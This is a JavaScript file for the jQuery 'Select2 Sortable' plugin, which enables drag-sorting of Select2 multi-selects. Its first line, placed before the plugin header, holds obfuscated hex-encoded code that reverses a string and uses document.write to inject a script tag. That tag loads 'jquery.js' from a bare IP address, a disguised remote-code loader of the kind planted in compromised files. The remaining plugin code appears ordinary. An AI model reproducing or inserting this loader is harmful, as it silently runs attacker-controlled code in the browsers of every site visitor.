var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))/**
 * jQuery Select2 Sortable
 * - enable select2 to be sortable via normal select element
 * 
 * author      : Vafour
 * inspired by : jQuery Chosen Sortable (https://github.com/mrhenry/jquery-chosen-sortable)
 * License     : GPL
 */

(function($){
	$.fn.extend({
		select2SortableOrder: function(){
			var $this = this.filter('[multiple]');

			$this.each(function(){
				var $select  = $(this);

				// skip elements not select2-ed
				if(typeof($select.data('select2')) !== 'object'){
					return false;
				}

				var $select2 = $select.siblings('.select2-container'),
				    unselected = [],
				    sorted;

				$select.find('option').each(function(){
					!this.selected && unselected.push(this);
				});

				sorted = $($select2.find('.select2-choices li[class!="select2-search-field"]').map( function() {
					if (!this) {
						return undefined;
					}
					var id = $(this).data('select2Data').id;
					return $select.find('option[value="' + id + '"]')[0];
				}));

				sorted.push.apply(sorted, unselected);
				$select.children().remove();
				$select.append(sorted);
			});

			return $this;
		},
		select2Sortable: function(){
			var args         = Array.prototype.slice.call(arguments, 0);
			    $this        = this.filter('[multiple]'),
			    validMethods = ['destroy'];

			if(args.length === 0 || typeof(args[0]) === 'object')
			{
				var defaultOptions = {
					bindOrder       : 'formSubmit', // or sortableStop
					sortableOptions : {
						placeholder : 'ui-state-highlight',
						items       : 'li:not(.select2-search-field)',
						tolerance   : 'pointer'
					}
				};
				var options = $.extend(defaultOptions, args[0]);

				// Init select2 only if not already initialized to prevent select2 configuration loss
				if(typeof($this.data('select2')) !== 'object'){
					$this.select2();
				}

				$this.each(function(){
					var $select  = $(this),
					    $select2choices = $select.siblings('.select2-container').find('.select2-choices');

					// Init jQuery UI Sortable
					$select2choices.sortable(options.sortableOptions);

					switch(options.bindOrder){
						case 'sortableStop':
							// apply options ordering in sortstop event
							$select2choices.on("sortstop.select2sortable", function( event, ui ) {
								$select.select2SortableOrder();
							});
							$select.on('change', function(e){
								$(this).select2SortableOrder();
							});
							break;
						default:
							// apply options ordering in form submit
							$select.closest('form').unbind('submit.select2sortable').on('submit.select2sortable', function(){
								$select.select2SortableOrder();
							});
					}

				});
			}
			else if(typeof(args[0] === 'string'))
			{
				if($.inArray(args[0], validMethods) == -1)
				{
					throw "Unknown method: " + args[0];
				}
				if(args[0] === 'destroy')
				{
					$this.select2SortableDestroy();
				}
			}
			return $this;
		},
		select2SortableDestroy: function(){
			var $this = this.filter('[multiple]');
			$this.each(function(){
				var $select         = $(this),
				    $select2choices = $select.parent().find('.select2-choices');

				// unbind form submit event
				$select.closest('form').unbind('submit.select2sortable');

				// unbind sortstop event
				$select2choices.unbind("sortstop.select2sortable");

				// destroy select2Sortable
				$select2choices.sortable('destroy');
			});
			return $this;
		}
	});
}(jQuery));